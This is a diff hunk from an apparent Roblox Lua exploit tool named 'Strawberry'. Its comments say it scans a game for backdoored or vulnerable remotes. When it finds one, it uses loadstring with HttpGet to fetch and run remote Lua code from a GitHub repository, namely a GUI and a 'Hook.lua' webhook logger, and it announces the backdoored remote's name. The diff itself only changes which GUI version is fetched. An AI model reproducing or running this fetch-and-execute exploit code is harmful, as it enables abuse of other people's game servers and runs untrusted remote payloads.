@@ -179,7 +179,7 @@ scan(); -- // scans the WHOLE game for vuln/backdoored remotes
 task.wait();
 if backdoorfound then
 	-- // loads up the gui and webhook log after backdoor/vuln is found :3
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/UI_Source/v6.lua"))();
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/UI_Source/v.5.50.lua"))();
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/Hook.lua"))();
 	scanninghint.Text = "STRAWBERRY V6.5: Backdoor found in "..tostring(timer).." seconds! (Backdoored Remote name: "..vulnremote.Name..")";
 	task.wait(10);
